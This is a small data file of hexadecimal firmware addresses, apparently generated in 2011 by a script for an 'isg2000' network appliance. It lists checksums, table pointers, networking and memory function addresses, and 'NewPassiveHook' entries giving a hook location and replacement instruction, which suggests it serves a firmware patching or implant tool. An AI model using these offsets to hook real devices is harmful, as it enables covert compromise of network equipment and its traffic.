0x2614080F
0xffffffff
0x0     0x0037A9C4
0x1     0x0038D7E8
0x3     0x00765BF0
0x6     0x00388EE8
0x7     0x00380D44
0x8     0x00390724
0x9     0x003AB024
0xa     0x003AABC0
0xf     0x01082960
0x15    0x003BB6FC
0x17    0x00380E30
0x19    0x003C8254
0x20    0x00367B78
0x21    0x0037B880
0x22    0x02D0092C
0x23    0x00061C00
0x24    0x00083614
0x25    0x48061C03
0x26    0x02D00908
0x28    0x02F6F138
0x29    0x00E90130
0x2f    0x03221F6C
0x30    0x00000018
0x31    0x00000034
0x32    0x00000094
0x33    0x00000000
0x34    0x00000070
0x35    0x02C48034
0x3b    0x003E4248
0x3c    0x003E45EC
0x3d    0x003E3AD8
0x3e    0x003E48F4
0x3f    0x00E932E4
0x40    0x03266A88
0x41    0xFFFFFE74
0x42    0x0034F698
:EOS:
ArpTableAddrPtr      0x0324AB4C
ConfigAddr           0x03257210
PingPtr              0x02E29C24
SafeSpace            0x02BFA000
ImgCkSum             0x3009980F
CodeCkSum            0x38BF3CDB
SystemCkSum          0x3AE427FB
TimeTablePtr         0x032E1FBC
LogTablePtr          0x03261268
LogOptsPtr           0x0325FDA8
CritTablePtr         0x03261278
MixedConfig          0x00B6DAB4
SerialStrPtr         0x032DD660
NewPassiveHookFunc   0x0037F4EC
NewPassiveHookLoc    0x00B7A934
NewPassiveHookRepl   0x48061C03
flashSemAddr         0x035DC5EC
flashSemUseOffset    0x00000018
Printf               0x003AABC0
Socket               0x00773160
Bind                 0x00773F38
Connect              0x007758BC
Send                 0x00776160
Recv                 0x007767F0
Close                0x00776D10
Malloc               0x00390724
Free                 0x003AB024
Resched              0x0037B000
:EOS:

;Dat file created 26 Sep 2011 by isg2000.py  Revision: 4740

